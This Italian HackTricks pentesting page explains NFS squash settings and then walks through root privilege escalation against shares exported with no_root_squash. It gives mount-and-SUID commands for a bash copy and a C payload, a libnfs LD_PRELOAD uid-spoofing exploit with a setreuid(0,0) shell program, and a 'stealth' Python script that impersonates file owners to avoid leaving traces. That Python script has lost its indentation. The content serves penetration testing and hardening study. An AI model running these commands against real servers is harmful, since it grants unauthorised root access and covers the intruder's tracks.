{{#include ../../banners/hacktricks-training.md}}

# Informazioni di Base sullo Squashing

NFS di solito (soprattutto in linux) si fida del `uid` e `gid` indicati dal client che si connette per accedere ai file (se non viene utilizzato kerberos). Tuttavia, ci sono alcune configurazioni che possono essere impostate nel server per **cambiare questo comportamento**:

- **`all_squash`**: Squasha tutti gli accessi mappando ogni utente e gruppo a **`nobody`** (65534 unsigned / -2 signed). Pertanto, tutti sono `nobody` e non vengono utilizzati utenti.
- **`root_squash`/`no_all_squash`**: Questo è il valore predefinito su Linux e **squasha solo l'accesso con uid 0 (root)**. Pertanto, qualsiasi `UID` e `GID` sono fidati, ma `0` è squashed a `nobody` (quindi non è possibile impersonare root).
- **``no_root_squash`**: Questa configurazione, se abilitata, non squasha nemmeno l'utente root. Questo significa che se monti una directory con questa configurazione, puoi accedervi come root.

Nel file **/etc/exports**, se trovi qualche directory configurata come **no_root_squash**, allora puoi **accedervi** da **client** e **scrivere all'interno** di quella directory **come** se fossi il **root** locale della macchina.

Per ulteriori informazioni su **NFS** controlla:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Escalation dei Privilegi

## Exploit Remoto

Opzione 1 usando bash:
- **Montare quella directory** in una macchina client e **come root copiare** all'interno della cartella montata il **/bin/bash** binario e dargli i diritti **SUID**, ed **eseguire dalla macchina vittima** quel binario bash.
- Nota che per essere root all'interno della condivisione NFS, **`no_root_squash`** deve essere configurato nel server.
- Tuttavia, se non è abilitato, potresti escalare a un altro utente copiando il binario nella condivisione NFS e dandogli il permesso SUID come l'utente a cui vuoi escalare.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opzione 2 utilizzando codice compilato in C:
- **Montare quella directory** su una macchina client e **come root copiare** all'interno della cartella montata il nostro payload compilato che sfrutterà il permesso SUID, dargli diritti **SUID** e **eseguire da parte della vittima** quella binario (puoi trovare qui alcuni [C SUID payloads](payloads-to-execute.md#c)).
- Stesse restrizioni di prima
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> Nota che se puoi creare un **tunnel dalla tua macchina alla macchina della vittima, puoi comunque utilizzare la versione Remota per sfruttare questa escalation di privilegi tunnelando le porte richieste**.\
> Il seguente trucco è nel caso in cui il file `/etc/exports` **indichi un IP**. In questo caso **non sarai in grado di utilizzare** in alcun modo il **remote exploit** e dovrai **sfruttare questo trucco**.\
> Un altro requisito necessario affinché l'exploit funzioni è che **l'export all'interno di `/etc/export`** **deve utilizzare il flag `insecure`**.\
> --_Non sono sicuro che se `/etc/export` indica un indirizzo IP questo trucco funzionerà_--

## Basic Information

Lo scenario prevede di sfruttare una condivisione NFS montata su una macchina locale, sfruttando un difetto nella specifica NFSv3 che consente al client di specificare il proprio uid/gid, potenzialmente abilitando l'accesso non autorizzato. Lo sfruttamento coinvolge l'uso di [libnfs](https://github.com/sahlberg/libnfs), una libreria che consente la falsificazione delle chiamate RPC NFS.

### Compiling the Library

I passaggi per la compilazione della libreria potrebbero richiedere aggiustamenti in base alla versione del kernel. In questo caso specifico, le syscalls fallocate sono state commentate. Il processo di compilazione prevede i seguenti comandi:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Eseguire l'Exploit

L'exploit comporta la creazione di un semplice programma C (`pwn.c`) che eleva i privilegi a root e poi esegue una shell. Il programma viene compilato e il binario risultante (`a.out`) viene posizionato nella condivisione con suid root, utilizzando `ld_nfs.so` per falsificare l'uid nelle chiamate RPC:

1. **Compila il codice dell'exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Posizionare l'exploit nella condivisione e modificare le sue autorizzazioni falsificando l'uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Esegui l'exploit per ottenere privilegi di root:**
```bash
/mnt/share/a.out
#root
```
## Bonus: NFShell per Accesso ai File Stealth

Una volta ottenuto l'accesso root, per interagire con la condivisione NFS senza cambiare la proprietà (per evitare di lasciare tracce), viene utilizzato uno script Python (nfsh.py). Questo script regola l'uid per corrispondere a quello del file a cui si accede, consentendo l'interazione con i file sulla condivisione senza problemi di autorizzazione:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Esegui come:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
